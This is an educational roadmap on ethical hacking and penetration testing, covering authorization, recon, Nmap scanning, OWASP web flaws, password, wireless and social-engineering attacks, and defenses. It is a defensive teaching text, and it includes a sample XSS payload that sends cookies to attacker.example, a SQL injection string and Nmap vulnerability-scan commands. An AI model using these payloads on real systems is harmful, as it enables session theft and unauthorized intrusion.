# Ethical Hacking (Offensive Security) — Deep Dive Roadmap

We'll go from fundamentals & legality → reconnaissance → network & web application attacks → post-exploitation → wireless & social engineering → defensive countermeasures → certifications & interview prep.

*This file covers ethical hacking / penetration testing as a professional discipline — the methodology, tools, and mindset used to find and responsibly report vulnerabilities in systems you are explicitly authorized to test. It is written for authorized security testing, CTF competitions, and defensive learning — every technique here is paired with the defensive countermeasure that stops it. ## 1. Ethical Hacking Fundamentals & Legal Framework

**Definition:** ethical hacking is the practice of using the same techniques, tools, and mindset as a malicious attacker, but **with explicit, documented authorization** from the system's owner, for the purpose of finding and reporting vulnerabilities before a genuine attacker does — the entire discipline's legitimacy rests on this authorization; the identical technical action (scanning a network, attempting to bypass a login) is a professional service with authorization and a serious crime without it.

**The legal boundary: written authorization, scope, rules of engagement — Definition:** before any authorized testing begins, a **written authorization document** (commonly called a "get out of jail free" letter, though that phrase understates its actual legal seriousness) explicitly grants permission, signed by someone with the actual authority to grant it for the specific systems in question; a **scope document** defines exactly which systems, IP ranges, and applications are in bounds (and, just as importantly, what's explicitly **out of bounds** — a shared hosting environment might mean the target application's server also hosts other customers' unrelated applications, which testing must not touch); **rules of engagement** define the testing window, acceptable techniques (is a Denial-of-Service test permitted, or explicitly excluded given its potential business impact), and escalation/communication procedures if something goes wrong mid-test — testing anything, in any way, without all of this in place first is illegal computer intrusion, regardless of intent, in virtually every jurisdiction (the U.S. Computer Fraud and Abuse Act and equivalent laws elsewhere draw no distinction based on the tester's good intentions).

**Types of hackers — the distinction is about authorization, not skill — Definition:** a **white hat** operates with authorization, disclosing findings responsibly; a **black hat** operates without authorization, for personal gain or malicious intent; a **grey hat** operates without explicit authorization but without clearly malicious intent either (e.g. discovering and reporting a vulnerability in a system they weren't authorized to test) — grey-hat activity, however well-intentioned, remains **legally unauthorized access** in most jurisdictions and carries genuine legal risk, which is precisely why this entire file's practical guidance (section 15) directs practice exclusively toward explicitly-designated legal targets rather than "just testing a real site you found a bug in."

**Responsible disclosure & bug bounty programs — Definition:** **responsible disclosure** is the practice of privately reporting a discovered vulnerability to the affected organization, giving them a reasonable window to fix it **before** any public disclosure — protecting users from the vulnerability being exploited by others in the meantime while still ensuring accountability if a fix never comes; **bug bounty programs** (HackerOne, Bugcrowd, or a company's own program) formalize this into an explicitly authorized, often paid, structured process — critically, a bug bounty program's published scope **is** the authorization document described above; testing anything outside a program's explicitly listed scope is unauthorized, even on the same company's infrastructure.

## 2. The Penetration Testing Methodology

**The standard phases — Definition:** a professional penetration test follows a structured sequence: **reconnaissance** (section 3 — gathering information about the target without directly interacting in a detectable way); **scanning/enumeration** (section 4 — actively probing to discover live systems, open ports, and running services); **gaining access** (sections 5–9 — exploiting a discovered vulnerability to obtain some level of unauthorized access); **maintaining access** (establishing persistence, relevant primarily to simulating a realistic, sustained attacker rather than a one-off vulnerability check); **covering tracks** (in a real attack, erasing evidence — in an *authorized* test, this phase is typically skipped or replaced with careful logging of every action taken, since the goal is a transparent, reviewable engagement, not evading the client's own detection); **reporting** (section 2's final point below) — this phase structure mirrors, not coincidentally, the actual attack lifecycle a genuine adversary follows, which is precisely why understanding it is valuable for defenders too (section 14).

**Black-box vs white-box vs grey-box testing — Definition:** **black-box** testing gives the tester **no** internal information — they start with only a target's public-facing name/URL, simulating a genuine external attacker with zero insider knowledge; **white-box** testing gives the tester full access to source code, architecture diagrams, and credentials — trading realism for thoroughness, since a tester can examine every code path directly rather than needing to first discover it exists; **grey-box** sits between the two (e.g. a tester given a standard user account but no source code) — the choice depends on the test's actual goal: black-box better simulates a real external threat; white-box finds more vulnerabilities faster and more thoroughly since nothing needs to be rediscovered from scratch.

**Scoping a penetration test — Definition:** beyond the legal scope document (section 1), technical scoping defines exactly which testing techniques are permitted — is social engineering (section 11) in scope, is a Denial-of-Service test acceptable given potential business disruption, are production systems in scope at all or only a staging environment, what's the testing time window (some organizations restrict testing to off-peak hours specifically to limit business impact if something goes wrong) — a well-scoped test is a negotiated agreement between thoroughness and acceptable business risk, not simply "test everything, as hard as possible."

**Reporting — the deliverable that actually matters most — Definition:** a penetration test's actual value to the client is **the report**, not merely "did the tester get in" — a genuinely useful report documents each finding with its severity (commonly scored via CVSS, section 9), clear reproduction steps, the actual business impact if exploited, and specific, actionable remediation guidance — a report that just says "we found XSS" without reproduction steps or remediation guidance is far less useful than one a development team can act on directly; this is why the reporting phase, though it happens last, is arguably the actual product of the entire engagement, and experienced testers spend disproportionate effort getting it right.

## 3. Reconnaissance & OSINT

**Passive vs active reconnaissance — Definition:** **passive** reconnaissance gathers information about a target **without ever directly interacting with it** — no network traffic sent to the target at all, using only publicly available sources — genuinely undetectable by the target, since nothing they could log ever occurred; **active** reconnaissance involves direct interaction (visiting the target's website, querying its DNS servers directly) — still typically low-risk and often indistinguishable from ordinary traffic, but detectable in principle if the target is specifically monitoring for reconnaissance activity, unlike passive recon's complete invisibility.

**OSINT techniques — Definition:** **OSINT (Open-Source Intelligence)** gathers information from publicly available sources — **WHOIS** lookups reveal domain registration details (though privacy protection services now commonly redact the actual registrant); **DNS enumeration** discovers subdomains, mail servers, and infrastructure hints from DNS records (Communication notes' section 1); **search engine dorking** uses advanced search operators (`site:example.com filetype:pdf`) to surface indexed but not-obviously-linked content, sometimes including accidentally-exposed sensitive documents; **social media** reconnaissance builds a picture of an organization's employees, technology stack (job postings frequently reveal exactly which frameworks/tools a company uses), and potential social engineering targets (section 11).

```
# Passive DNS enumeration examples (read-only queries, standard tooling)
whois example.com
dig example.com ANY
nslookup -type=MX example.com
```

**Tools: theHarvester, Shodan, Maltego (conceptual overview) — Definition:** **theHarvester** automates gathering emails, subdomains, and employee names from public sources; **Shodan** is a search engine indexing internet-connected devices themselves (not web pages) — genuinely useful defensively too, since an organization can search Shodan for **its own** exposed infrastructure to discover what an attacker would already see, directly informing section 14's defensive posture; **Maltego** provides visual link-analysis, mapping relationships between discovered entities (domains, people, infrastructure) — all three tools exclusively **aggregate and present already-public information**, never themselves breaching any system, which is precisely why passive OSINT carries minimal legal risk even outside a formally scoped engagement (though acting on what's discovered still requires authorization).

**Building a target profile before touching the target directly — Definition:** the practical output of the reconnaissance phase is a structured profile — technology stack, employee names/roles, infrastructure map, potential entry points — assembled entirely from passive/low-risk sources **before** any active scanning (section 4) begins, since a well-built profile makes every subsequent phase dramatically more efficient and targeted rather than starting active probing blind.

## 4. Scanning & Enumeration

**Network scanning fundamentals — Definition:** **scanning** actively probes a target to discover what's actually running — which hosts are alive (**host discovery**), which ports are open on each (**port scanning**), and what service/version is listening on each open port (**service/version detection**) — the first genuinely active-reconnaissance phase (section 3), building directly on TCP/IP fundamentals already covered in the Communication notes' sections 1–2: a port scan works by attempting a TCP handshake (or sending a UDP packet) and interpreting the response (or lack of one) to infer a port's state.

**Nmap in depth — Definition:** **Nmap** is the standard, most widely-used network scanning tool — a **SYN scan** (`-sS`, the default for privileged users) sends only the first handshake packet (Communication notes' section 2's three-way handshake) and never completes the connection, faster and stealthier than a full connection; a **connect scan** (`-sT`) completes the full TCP handshake, usable without elevated privileges but more easily logged by the target; `-sV` performs service/version detection (identifying not just "port 80 is open" but "this is nginx 1.18.0"); `-A` enables aggressive detection (OS fingerprinting, script scanning, traceroute) — the **Nmap Scripting Engine (NSE)** extends Nmap with scripts for specific vulnerability checks, far beyond basic port scanning.

```bash
# Nmap usage — run only against systems you are explicitly authorized to scan
nmap -sV -p 1-1000 target.example.com          # service/version detection on the first 1000 ports
nmap -A -T4 192.168.1.0/24                        # aggressive scan across an authorized lab subnet
nmap --script vuln target.example.com               # run NSE's vulnerability-detection script category
```

**Enumeration: identifying services, versions, and misconfigurations — Definition:** once a scan reveals *what's* running, enumeration digs deeper into *how it's configured* — is an FTP server allowing anonymous login, is a web server exposing a directory listing, does an SMB share allow unauthenticated access, is a discovered service running an outdated, known-vulnerable version — this phase directly feeds the vulnerability-research phase (section 9), since a specific service name and version number is exactly what's needed to search for a matching known CVE.

**Vulnerability scanning vs manual enumeration — Definition:** an automated **vulnerability scanner** (Nessus, OpenVAS) checks a target against a large, maintained database of known vulnerability signatures — fast and broad coverage, but prone to both false positives (flagging something that isn't actually exploitable in this specific context) and false negatives (missing anything not in its signature database, including business-logic flaws no automated tool can meaningfully detect, section 6) — manual enumeration/testing remains essential specifically for the vulnerability classes automated scanning structurally can't catch, which is why a genuinely thorough penetration test always combines both rather than relying on scanner output alone.

## 5. Web Application Security — OWASP Top 10 Deep Dive

**Injection (SQL, command, LDAP) — recap SQL notes — Definition:** **injection** vulnerabilities occur when untrusted user input is concatenated directly into a command/query interpreter rather than being treated strictly as data — **SQL injection**, already covered from the defensive side in the SQL notes, is the classic example: if a query is built via string concatenation (`"SELECT * FROM users WHERE username = '" + input + "'"`), an attacker supplying `' OR '1'='1` as input can alter the query's actual logic entirely; **command injection** is the same fundamental flaw applied to OS shell commands rather than SQL; the universal, structural fix across every injection variant is the same: never build a command/query by concatenating untrusted input — use **parameterized queries/prepared statements** (SQL notes) or a language's equivalent safe-execution API, which keeps user input strictly separated from the command structure itself, making injection structurally impossible rather than merely filtered/sanitized against known bad patterns.

```javascript
// vulnerable — string concatenation lets an attacker alter the query's structure
const query = `SELECT * FROM users WHERE username = '${username}'`;

// secure — parameterized query; the database driver keeps input strictly separated from query structure
const query = 'SELECT * FROM users WHERE username = ?';
db.execute(query, [username]);
```

**Broken authentication & session management — Definition:** vulnerabilities in how a system verifies identity and maintains a logged-in state — weak password policies, missing account lockout after repeated failed attempts (enabling brute-force attacks, section 8), session tokens that don't expire or aren't regenerated after login (enabling session fixation), and predictable session identifiers — the same JWT/session-cookie security discipline already covered concretely across this workspace's Node.js/Java/Python/NestJS auth sections directly addresses this OWASP category.

**Cross-Site Scripting (XSS) — stored, reflected, DOM-based — Definition:** XSS occurs when untrusted input is rendered into a page as executable HTML/JavaScript rather than inert text — **reflected XSS** occurs when input from the current request (a URL parameter) is immediately echoed back into the page's output unescaped; **stored XSS** occurs when malicious input is saved (e.g. in a comment field) and later rendered to *other* users viewing that stored content — generally more dangerous, since it doesn't require tricking a specific victim into clicking a crafted link; **DOM-based XSS** occurs entirely client-side, when JavaScript itself takes untrusted data (e.g. from `location.hash`) and unsafely inserts it into the DOM (`innerHTML`) without the server ever being involved — the universal defense is **output encoding** (escaping HTML-significant characters before rendering user-controlled data) — React's default JSX rendering (React notes) automatically escapes rendered values specifically to prevent exactly this class of bug, which is why React's `dangerouslySetInnerHTML` API is deliberately named to flag that it opts out of this default protection.

```javascript
// the illustrative textbook payload — demonstrates why unescaped output is dangerous
// <script>document.location='https://attacker.example/steal?cookie='+document.cookie</script>

// vulnerable — directly inserting user input as HTML
element.innerHTML = userComment;

// secure — treating it strictly as text, not HTML
element.textContent = userComment;
```

**CSRF, SSRF, insecure deserialization — Definition:** **CSRF (Cross-Site Request Forgery)** tricks an authenticated user's browser into unknowingly submitting a request to a site they're logged into (exploiting the browser's automatic cookie-attaching behavior) — defended against via CSRF tokens (a unique, unpredictable value embedded in a form, verified server-side, that an attacker's cross-origin request can't know) or `SameSite` cookie attributes; **SSRF (Server-Side Request Forgery)** tricks a **server** into making a request to an unintended destination (often an internal-only resource the server can reach but an external attacker normally couldn't) — a class of vulnerability with particular relevance to cloud environments (section 12), since SSRF against a cloud instance's metadata endpoint has historically been used to steal cloud credentials; **insecure deserialization** occurs when an application deserializes untrusted data without validation, potentially letting an attacker construct a malicious serialized payload that executes code upon deserialization — all three share the same root cause pattern as injection: trusting data/requests that originate from, or are influenced by, an untrusted source.

**Security misconfiguration & vulnerable/outdated components — Definition:** default credentials left unchanged, verbose error messages leaking stack traces/internal paths to users, unnecessary services/ports left exposed, and outdated dependencies with known, unpatched CVEs (section 9) — these are less about a specific code-level flaw and more about **operational discipline**, directly connecting to the Deployment/Docker-Kubernetes notes' production-hardening discussions and the general "keep dependencies updated" guidance already implicit throughout this workspace's various package-manager sections (Node.js `npm audit`, Python's dependency-scanning tools).

## 6. Web Application Testing Tools & Techniques

**Burp Suite / OWASP ZAP — intercepting proxies — Definition:** both tools function as an **intercepting proxy** — sitting between the browser and the target application, capturing and letting a tester inspect/modify every HTTP request and response in transit — this is the foundational technique underlying essentially all manual web application testing, since it lets a tester directly manipulate values (parameters, headers, cookies) a normal browser UI would never allow editing, testing how the server actually handles unexpected/malicious input rather than only what the client-side UI permits — **Burp Suite** is the commercial, industry-standard tool; **OWASP ZAP** is a free, open-source alternative with substantially overlapping capability, a genuinely solid starting point for learning these techniques without cost.

**Manual testing vs automated scanning — Definition:** an automated scanner (built into both Burp and ZAP, or standalone) systematically tests known vulnerability patterns across every discovered endpoint — broad coverage, fast, but (as already noted in section 4) blind to business-logic flaws; **manual testing** — a human actually understanding the application's intended logic and deliberately probing for ways to subvert it — is what catches the vulnerability classes automated tooling structurally cannot, which is precisely why professional penetration testing is a skilled human discipline, not something fully replaceable by running a scanner and reading its output.

**Authentication & session testing, business logic flaws — Definition:** testing whether authentication can be bypassed (does a "forgot password" flow leak whether an email exists in the system, can a session token be predicted or reused after logout), and testing **business logic** — can a discount code intended for one-time use be applied repeatedly, can a multi-step checkout flow's steps be skipped or reordered to bypass a payment step, can a user access another user's data simply by changing an ID in the URL (an "Insecure Direct Object Reference," a specific, extremely common real-world instance of the broader access-control flaws OWASP tracks) — these require genuinely understanding what the application is *supposed* to do before a tester can recognize a way to make it do something it shouldn't.

**API security testing (recap Communication notes)** — REST/GraphQL/gRPC APIs (Communication notes' sections 5–9) carry their own specific testing concerns beyond traditional web-page testing — is authentication actually enforced on every endpoint (not just the ones a UI happens to link to — an API endpoint reachable directly, even if no UI element calls it, is still part of the attack surface), does rate limiting exist to prevent abuse, does a GraphQL API leak more data than intended through its flexible query shape (Communication notes' section 6), and is authorization checked per-object (not just "is this user logged in," but "is this *specific* logged-in user actually permitted to access *this specific* resource," the exact IDOR concern above, applied at the API layer).

## 7. Network Attacks & Defenses

**Man-in-the-Middle attacks — recap Communication notes — Definition:** an MITM attack (already covered defensively in the Communication notes' section 13) intercepts communication between two parties — **ARP spoofing** exploits the lack of authentication in the Address Resolution Protocol on a local network to trick a victim into sending traffic through the attacker's machine instead of the legitimate gateway; **DNS spoofing** (Communication notes' section 13) provides a forged DNS response, redirecting a victim to an attacker-controlled destination — both are directly, structurally mitigated by TLS (Communication notes' section 13): even if traffic is successfully intercepted, an attacker without the legitimate server's private key cannot decrypt it or forge a validly-signed certificate, which is precisely why "just use HTTPS everywhere" is such an effective, foundational defense against this entire attack category.

**Packet sniffing — Wireshark fundamentals — Definition:** **Wireshark** captures and displays raw network traffic passing through a network interface, letting a tester (or, defensively, a network administrator diagnosing an issue) inspect protocol-level detail directly — genuinely valuable both offensively (observing unencrypted traffic, if any exists, on a network segment) and defensively (diagnosing connectivity issues, verifying that sensitive traffic is in fact properly encrypted) — a tool whose value is fundamentally about **visibility into what's actually happening on the wire**, independent of whether it's being used for attack or defense.

**Denial of Service concepts (understanding, not executing) — Definition:** a **Denial of Service (DoS)** attack aims to make a system or service unavailable to legitimate users, typically by overwhelming it with traffic/requests beyond its capacity to handle; a **Distributed** DoS (DDoS) does the same from many sources simultaneously — understanding these concepts is valuable for defensive capacity planning and for recognizing an attack in progress (System Design notes' load-balancing/scaling discussions are directly relevant to a system's actual resilience against this), but **this file deliberately does not provide DoS attack tooling or techniques** — even in an authorized penetration test, DoS testing requires extremely explicit, separate authorization given its potential for genuine, hard-to-contain business disruption, and is generally excluded from a standard test's scope (section 2) unless specifically negotiated.

**Firewall & IDS/IPS evasion concepts — Definition:** a **firewall** filters traffic based on rules (source/destination, port, protocol); an **IDS (Intrusion Detection System)** monitors for suspicious patterns and alerts; an **IPS (Intrusion Prevention System)** does the same but actively blocks detected threats — understanding evasion concepts (fragmenting packets to avoid signature matching, timing scans to blend in with normal traffic) exists specifically so defenders can recognize and close the gaps evasion techniques exploit — in an authorized test, evasion testing exists to answer a concrete defensive question ("does our IDS actually catch this, or does it have a blind spot"), not to defeat security controls for their own sake.

## 8. System & Password Attacks

**Password cracking concepts: hashing, salting, rainbow tables — Definition:** a well-designed system never stores a password in plaintext — it stores a **hash** (a one-way transformation, already covered defensively via bcrypt across this workspace's Node.js/Java/Python/NestJS auth sections) — a **rainbow table** is a precomputed table mapping common password hashes back to their plaintext originals, letting an attacker with access to leaked hashes look up matches instantly rather than recomputing hashes on the fly; **salting** (prepending/appending a unique, random value to each password before hashing, which bcrypt does automatically) defeats rainbow tables entirely, since a precomputed table would need to account for every possible salt value, making the precomputation infeasible — this is precisely *why* bcrypt (specifically designed to be slow and automatically salted) is the correct choice over a fast, unsalted hash like plain SHA-256 for password storage, a point already made defensively throughout this workspace's backend auth sections and worth reinforcing here from the attacker's actual perspective.

**Brute force vs dictionary attacks — why rate limiting and MFA defeat them — Definition:** a **brute-force** attack tries every possible password combination systematically; a **dictionary attack** tries a curated list of likely passwords (common passwords, leaked-password lists, password variations based on the target's known personal details) — dictionary attacks are typically far more effective than pure brute force against real human-chosen passwords, since humans choose predictable passwords far more often than random ones; both are directly defeated by **rate limiting** (locking an account or introducing delay after repeated failed attempts, making a large-scale guessing attempt impractically slow) and **multi-factor authentication (MFA)** (even a correctly-guessed password alone is insufficient without the second factor) — the practical defensive lesson: password strength alone is a weaker control than these two structural, systemic defenses.

**Privilege escalation — Windows & Linux concepts — Definition:** **privilege escalation** is the process of gaining higher-level access than initially obtained — **vertical** escalation (a low-privilege user gaining administrator/root access, e.g. via an unpatched local vulnerability or a misconfigured file/service permission, section 2's POSIX permission model in the CLI notes being directly relevant to how misconfigurations here actually occur) versus **horizontal** escalation (gaining access to another user's equivalent-level resources without increasing privilege level) — a critical phase in a realistic attack simulation, since initial access is frequently obtained with limited privileges, and the actual damage/value of a compromise usually depends heavily on whether escalation is possible afterward.

**Credential stuffing & why password reuse is catastrophic — Definition:** **credential stuffing** takes username/password pairs leaked from **one** breached service and automatically tries them against **many other, unrelated** services, betting on the extremely common human habit of password reuse — this single attack technique is precisely why "use a unique password per site" (enabled practically via a password manager) is such consequential security advice: a breach at any one service you've ever used, entirely outside your own control, becomes a genuine threat to every other account where you reused that same password.

## 9. Exploitation Frameworks & Vulnerability Research

**Metasploit framework — architecture and authorized-lab usage only — Definition:** **Metasploit** is the standard, widely-used exploitation framework — a library of known exploits for cataloged vulnerabilities, packaged with a consistent interface for configuring and launching them against a target, plus **payloads** (the code executed on a successfully-exploited target) and **auxiliary modules** (scanning/enumeration helpers) — Metasploit's actual educational value is in understanding **how** a known vulnerability is actually exploited end-to-end, using it exclusively against deliberately vulnerable practice targets (section 15) or within an explicitly authorized, scoped engagement — running Metasploit against any system without authorization is unambiguous unauthorized computer access, identical in legal terms to any other unauthorized exploitation technique.

**CVE/CVSS — how vulnerabilities are catalogued and scored — Definition:** a **CVE (Common Vulnerabilities and Exposures)** identifier is a unique, standardized reference for a specific, publicly disclosed vulnerability (`CVE-2021-44228`, the Log4Shell vulnerability, for instance) — the shared vocabulary that lets a scanner, a vendor's patch notes, and a security report all unambiguously refer to the exact same issue; **CVSS (Common Vulnerability Scoring System)** produces a standardized severity score (0–10) based on factors like exploitability, required privileges, and impact — directly feeding the severity ratings a penetration test report (section 2) assigns to its findings, giving a client an objective, comparable basis for prioritizing which vulnerabilities to fix first rather than relying purely on subjective judgment.

**Exploit development concepts (buffer overflows, brief) — recap C++ notes — Definition:** a **buffer overflow** occurs when a program writes more data into a fixed-size buffer than it was allocated to hold, overwriting adjacent memory — in the worst case, overwriting a function's return address on the call stack, letting a sufficiently crafted overflow redirect program execution to attacker-controlled code — a vulnerability class fundamentally rooted in exactly the manual-memory-management risks already covered defensively in the C++ notes' sections 2 and 13 (undefined behavior, out-of-bounds writes) — this is precisely why memory-safe languages (Java, Python, JS/TS, Rust, all covered elsewhere in this workspace) structurally eliminate this entire vulnerability class by construction, while C/C++ code remains permanently exposed to it without careful, disciplined bounds-checking — genuinely low-level exploit development is a specialized sub-discipline well beyond this overview section's scope, included here specifically so the *conceptual* link back to this workspace's own memory-safety discussions is explicit.

**Zero-days vs known vulnerabilities — the patching race — Definition:** a **zero-day** vulnerability is one not yet publicly known or patched by the vendor — genuinely dangerous specifically because no defense (a patch, a known signature for a scanner/IDS to detect) yet exists; a **known** vulnerability (cataloged via CVE, above) has a patch available, meaning the ongoing risk is purely a function of **how quickly organizations actually apply it** — the well-documented, sobering reality that the large majority of real-world breaches exploit **known, already-patched** vulnerabilities rather than novel zero-days is the single strongest practical argument for the "keep dependencies updated" discipline already emphasized generally throughout this workspace's various package-manager and deployment sections — patch management, unglamorous as it is, prevents dramatically more real-world compromise than any offensive technique in this file protects against on its own.

## 10. Wireless Security

**Wi-Fi security protocols: WEP, WPA, WPA2, WPA3 — why WEP is broken — Definition:** **WEP (Wired Equivalent Privacy)**, Wi-Fi's original security protocol, has fundamental, well-documented cryptographic flaws (reused key streams due to a too-short initialization vector) that let its encryption key be recovered from captured traffic within minutes using publicly available tools — WEP should never be used under any circumstances today; **WPA/WPA2** addressed WEP's flaws with genuinely stronger cryptography (though WPA2's handshake itself became a known, if narrower, attack target); **WPA3** further strengthens the protocol, notably replacing the vulnerable handshake mechanism with one specifically resistant to offline dictionary attacks against a captured handshake — the practical defensive guidance distilled from this entire history: use WPA3 where available, WPA2 at minimum, and never WEP.

**Wireless attack concepts (lab/CTF context only) — Definition:** a **deauthentication attack** sends forged deauthentication frames (exploiting the lack of authentication on Wi-Fi management frames in older protocol versions) to forcibly disconnect a client, commonly used to capture the subsequent **handshake** as the client reconnects — the handshake capture can then be tested offline against a password dictionary (section 8) to attempt password recovery — this technique has real, legitimate educational and authorized-testing value (assessing whether an organization's Wi-Fi password is genuinely strong enough to resist this exact attack) but, like every other technique in this file, only against networks you own or are explicitly authorized to test — deauthenticating a neighbor's or a business's Wi-Fi network without authorization is illegal.

**Bluetooth & IoT device security concerns — Definition:** Bluetooth and IoT devices frequently ship with weak default configurations (unchanged default PINs/passwords, unencrypted communication, outdated firmware never updated post-purchase) — a genuinely large and growing attack surface given how many such devices exist on typical home/corporate networks with minimal ongoing security attention, directly relevant to the broader "security misconfiguration" OWASP category (section 5) applied specifically to embedded/IoT devices rather than web applications.

**Defensive wireless configuration — Definition:** the practical countermeasures directly following from the attack concepts above: WPA3 (or WPA2 minimum), a genuinely strong, unique Wi-Fi password (defeating dictionary attacks against a captured handshake, section 8), network segmentation (keeping IoT devices on a separate network segment/VLAN from sensitive systems, so a compromised smart device can't directly reach more sensitive infrastructure), and keeping device firmware updated (directly addressing section 9's patching-race point, applied to network hardware/IoT devices specifically).

## 11. Social Engineering

**Why humans are the weakest link — psychology over technology — Definition:** social engineering exploits **human psychology** rather than any technical vulnerability — no firewall, encryption, or patch defends against an employee being convincingly tricked into voluntarily handing over a password or clicking a malicious link — this is precisely why, across essentially every major real-world breach post-mortem, social engineering (particularly phishing) remains one of the most common actual initial-access vectors, regardless of how technically sophisticated an organization's other defenses are — a genuinely important, humbling point for any security discussion that might otherwise focus disproportionately on purely technical attack/defense.

**Phishing, pretexting, baiting — recognizing and defending against each — Definition:** **phishing** sends deceptive communication (most commonly email) impersonating a trusted source to trick a victim into revealing credentials or installing malware — **spear phishing** targets a specific individual with personalized, researched detail (directly building on section 3's OSINT techniques) rather than a generic mass email, meaningfully more convincing and effective; **pretexting** fabricates a plausible scenario/identity to manipulate a victim (impersonating IT support requesting a password "for a system update"); **baiting** offers something enticing (a free download, a found USB drive) to lure a victim into a compromising action — the shared defensive countermeasure across all three is the same: verify unexpected requests through an independent, trusted channel (calling a known phone number rather than one provided in the suspicious message itself) rather than trusting the request at face value.

**Physical security & tailgating — Definition:** **tailgating** (or "piggybacking") is following an authorized person through a secured physical entry point without presenting one's own credentials — a reminder that security extends beyond purely digital controls entirely; physical access to a device or network jack can bypass a great deal of purely software-based security, which is why comprehensive security assessments (and comprehensive defense, section 14) consider physical access controls as part of the same overall threat model, not a separate, unrelated concern.

**Security awareness training as the actual countermeasure — Definition:** given that social engineering exploits people rather than systems, the most effective defense is **training people to recognize and appropriately respond to it** — regular phishing simulations (sending deliberately crafted, safe test phishing emails to measure and improve an organization's actual susceptibility), clear reporting procedures for suspicious communication, and a genuinely blame-free culture around reporting a mistake (an employee who clicked a phishing link and is afraid to report it, for fear of punishment, causes far more damage through the resulting delay than one who immediately reports it) — directly connecting to section 14's broader defense-in-depth philosophy: technical controls alone are insufficient without the human layer being actively strengthened too.

## 12. Cloud & Container Security Testing

**Cloud-specific attack surface (recap AWS notes) — Definition:** cloud environments introduce attack surface with no direct on-premises equivalent — **misconfigured S3 buckets** (accidentally left publicly readable/writable, a genuinely common and repeatedly-publicized real-world breach cause), **IAM over-permissioning** (a service or user granted far broader permissions than actually needed, directly violating the principle of least privilege already implicit in the AWS notes' IAM discussion — a single compromised, over-permissioned credential then grants an attacker access far beyond what that specific compromised component actually needed), and exposed cloud **metadata endpoints** (the SSRF-to-credential-theft path already flagged in section 5) — testing cloud environments requires understanding these cloud-native risk patterns specifically, since they're structurally different from traditional network/application vulnerabilities even though the underlying principle (excessive, unnecessary access) is a familiar one.

**Container/Kubernetes security concerns (recap Docker-Kubernetes notes) — Definition:** containers sharing a host's kernel (Docker-Kubernetes notes) introduce **container escape** as a genuine risk category — a vulnerability letting a process break out of its container's isolation and access the underlying host or other containers; overly permissive container configurations (running as root inside the container unnecessarily, mounting sensitive host paths into a container without genuine need) directly widen this risk; Kubernetes-specific concerns include overly permissive RBAC policies (Kubernetes' own access-control system) and exposed, unauthenticated Kubernetes API servers — the same least-privilege principle from the cloud discussion above, applied specifically to container/orchestration infrastructure.

**Shared responsibility model — what you're authorized to test — Definition:** cloud providers (AWS notes) operate under a **shared responsibility model** — the provider secures the underlying infrastructure (physical data centers, the hypervisor layer), while the customer is responsible for securing what they configure and deploy on top of it — critically, this also defines **testing authorization boundaries**: most cloud providers have specific policies about what a customer is permitted to security-test without separate, explicit provider authorization (testing your own application's configuration is generally fine; testing the underlying cloud infrastructure itself is generally not, and may require prior notification even for authorized customer-side testing) — a genuinely important, easy-to-overlook scoping consideration specific to cloud environments that doesn't arise in traditional on-premises testing.

**Infrastructure-as-Code security scanning — Definition:** since cloud/container infrastructure is increasingly defined declaratively (Terraform, Kubernetes manifests, Docker-Kubernetes notes), dedicated IaC scanning tools (Checkov, tfsec) can catch security misconfigurations **before deployment** — directly shifting this entire category of vulnerability left, into the same CI/CD pipeline already covered in the Automation/Deployment notes, rather than discovering a misconfigured S3 bucket only after it's already live and potentially already exposed.

## 13. Cryptography Fundamentals for Security Testing

**Symmetric vs asymmetric encryption (recap Communication notes) — Definition:** **symmetric** encryption uses the same key for both encryption and decryption — fast, but requires securely sharing that key between both parties beforehand, a genuine chicken-and-egg problem over an untrusted network; **asymmetric** (public-key) encryption uses a mathematically-related key pair — data encrypted with a public key can only be decrypted with the corresponding private key — solving the key-distribution problem (a public key can be shared freely) at the cost of being computationally slower — this is precisely why TLS (Communication notes' section 13) uses **both**: asymmetric cryptography during the handshake specifically to securely establish a shared secret, then fast symmetric encryption for the actual bulk data transfer afterward.

**Hashing vs encryption — why they solve different problems — Definition:** **encryption** is reversible (with the correct key) — designed for confidentiality of data that legitimately needs to be recovered later; **hashing** is deliberately **one-way** and irreversible — designed for integrity verification and, specifically for passwords (section 8), for storing a value that never needs to be recovered in its original form at all, only compared against — a common, security-relevant mistake is using encryption where hashing is actually the correct tool (or vice versa); passwords should always be hashed (with a slow, salted algorithm like bcrypt), never merely encrypted, since encryption implies the plaintext is recoverable given the right key — a property password storage should never actually have.

**Common cryptographic weaknesses — Definition:** using a deprecated, broken algorithm (MD5 and SHA-1 are both cryptographically broken for security purposes, despite remaining common in legacy systems — MD5's collision vulnerabilities in particular make it unsuitable for any security-relevant use, though it remains fine for non-security uses like a simple checksum); **poor key management** (hardcoding encryption keys directly in source code — a mistake this workspace's own `.env`/secrets-management discussions across the Node.js/Java/Python/Deployment notes exist specifically to prevent); using a fixed, predictable initialization vector (IV) with an algorithm that requires a unique one per encryption operation — each of these represents cryptography being implemented incorrectly despite using fundamentally sound underlying algorithms, which is precisely why "don't roll your own crypto, and don't misuse a well-vetted library's crypto either" is such consistently emphasized security guidance.

**TLS/SSL testing — identifying misconfigurations — Definition:** even with TLS properly enabled, real-world misconfigurations are common — supporting deprecated, weak protocol versions (SSLv3, TLS 1.0/1.1) alongside modern ones, weak cipher suite configuration, an expired or misconfigured certificate, or missing HSTS (HTTP Strict Transport Security, a header instructing browsers to *always* use HTTPS for a given domain, preventing an attacker from downgrading a connection to plain, unencrypted HTTP) — tools like `testssl.sh` or online scanners (Qualys SSL Labs) systematically check a live server's TLS configuration against current best practices, directly operationalizing the TLS concepts already covered in the Communication notes' section 13.

## 14. Defensive Security & Blue Team Fundamentals

**Defense in depth — layered security controls — Definition:** **defense in depth** is the principle that security should never rely on any single control — multiple independent, overlapping layers (network firewalls, application-level input validation, least-privilege access controls, monitoring/detection, section 5's secure-coding practices) mean that a failure in any one layer doesn't automatically result in a full compromise, since subsequent layers still provide protection — directly the reason this entire file has consistently paired every offensive technique with its specific defensive countermeasure: real security posture is the accumulated result of many such individual countermeasures working together, not any single silver-bullet control.

**Security monitoring, logging & SIEM concepts — Definition:** comprehensive **logging** (recording authentication attempts, access to sensitive resources, configuration changes) is a prerequisite for detecting an attack in progress or reconstructing what happened after the fact — a **SIEM (Security Information and Event Management)** system aggregates logs from across an entire environment and applies correlation rules to surface genuinely suspicious patterns amid the enormous volume of routine, legitimate log data — directly connecting to the general observability/monitoring discipline already covered generally in the Deployment and System Design notes, here specifically applied to the security-relevant subset of what's being observed.

